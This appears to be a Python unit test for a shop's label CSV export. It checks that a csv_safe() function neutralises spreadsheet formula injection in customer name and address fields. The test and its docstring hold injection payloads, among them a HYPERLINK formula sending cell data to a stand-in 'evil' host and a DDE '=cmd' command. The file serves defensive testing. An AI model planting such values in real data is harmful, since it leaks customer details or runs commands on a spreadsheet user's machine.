"""The Pirate Ship label export, and the spreadsheet-formula injection it used to carry.

Every name and address line in /api/labels.csv is typed by a customer at checkout. The owner then
opens that file in Excel or Sheets and uploads it to Pirate Ship. A cell beginning =, +, -, @, tab
or CR is parsed as a FORMULA by every major spreadsheet, so a buyer could name themselves
`=HYPERLINK("http://evil/?x="&A1,"hi")` and get code running in the owner's spreadsheet with the
whole order sheet — names, addresses, emails — in scope.

csv.writer does not help. It quotes delimiters so the file parses correctly; the danger is in how
the file is interpreted afterwards, which is not a syntax question.
"""
import importlib.util
import os
import unittest

APP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def load_server():
    """server.py from source. Importing by path keeps this independent of cwd and of __pycache__."""
    spec = importlib.util.spec_from_file_location("server_under_test",
                                                  os.path.join(APP_DIR, "server.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class TestCsvFormulaInjection(unittest.TestCase):
    def setUp(self):
        self.srv = load_server()

    def test_every_formula_trigger_is_neutralised(self):
        for payload in ('=HYPERLINK("http://evil/?x="&A1,"click")',
                        "=cmd|'/c calc'!A1",
                        "+1+1",
                        "-2+3",
                        "@SUM(A1:A99)",
                        "\tstarts with a tab",
                        "\rstarts with a CR"):
            with self.subTest(payload=payload[:20]):
                out = self.srv.csv_safe(payload)
                self.assertTrue(out.startswith("'"), f"{payload!r} was left executable")
                self.assertEqual(out[1:], payload, "the original text must be preserved intact")

    def test_ordinary_addresses_are_untouched(self):
        """This must not corrupt real data — it fires only on input already malformed."""
        for good in ("Diego Flores", "123 Main St", "Apt 4B", "Tucson", "AZ", "85641", "US",
                     "O'Brien", "3x Graphic Tee — Style 1 (M)", "Ste. #200"):
            with self.subTest(value=good):
                self.assertEqual(self.srv.csv_safe(good), good)

    def test_empty_and_none_are_safe(self):
        self.assertEqual(self.srv.csv_safe(""), "")
        self.assertEqual(self.srv.csv_safe(None), "")

    def test_non_strings_survive(self):
        self.assertEqual(self.srv.csv_safe(42), "42")

    def test_the_export_routes_customer_fields_through_it(self):
        """A new column added later must not quietly skip the guard.

        Checked against the source rather than a live export because the risk is a future edit
        adding a raw ship.get(...) back into the row.
        """
        src = open(os.path.join(APP_DIR, "server.py"), encoding="utf-8").read()
        block = src[src.index('if path == "/api/labels.csv":'):]
        block = block[:block.index("body = buf.getvalue()")]
        for field in ("name", "address1", "address2", "city", "state", "zip", "country"):
            with self.subTest(field=field):
                self.assertIn(f'csv_safe(ship.get("{field}"', block,
                              f"ship_to.{field} reaches the CSV without csv_safe()")
        self.assertNotIn("\n                        ship.get(", block,
                         "a ship_to field is being written raw")


if __name__ == "__main__":
    unittest.main(verbosity=2)
